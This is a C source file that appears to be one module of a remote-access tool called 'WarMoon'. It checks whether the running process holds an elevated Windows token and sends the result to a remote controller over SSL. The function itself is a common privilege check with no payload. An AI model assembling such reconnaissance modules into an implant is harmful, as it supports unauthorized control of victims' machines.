#include "Variables.h"

int IsAdmin(SSL *ssl)
{
	char Success[] = "\033[0;35m[+] WarMoon Has Admin Privs!\033[0m\n";
	char Error[] = "\033[1;31m[-] WarMoon Doesn't Have Admin Privs\033[0m\n";
	char ErrorTokenInfo[] = "\033[1;31m[-] Couldn't get token information\033[0m\n";

	BOOL IsAdministrator = FALSE;
	HANDLE Token = NULL;
	TOKEN_ELEVATION Elevate;
	DWORD Size;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &Token) == 0)
	{
		SSL_write(ssl, ErrorTokenInfo, sizeof(ErrorTokenInfo));
		return EXIT_FAILURE;
	}

	if (GetTokenInformation(Token, TokenElevation, &Elevate, sizeof(Elevate), &Size) == 0)
	{
		SSL_write(ssl, ErrorTokenInfo, sizeof(ErrorTokenInfo));
		CloseHandle(Token);
		return EXIT_FAILURE;
	}

	IsAdministrator = Elevate.TokenIsElevated;

	if (IsAdministrator == 0)
	{
		SSL_write(ssl, Error, sizeof(Error));
		CloseHandle(Token);
		return EXIT_FAILURE;
	}

	SSL_write(ssl, Success, sizeof(Success));
	CloseHandle(Token);
	return EXIT_SUCCESS;
}
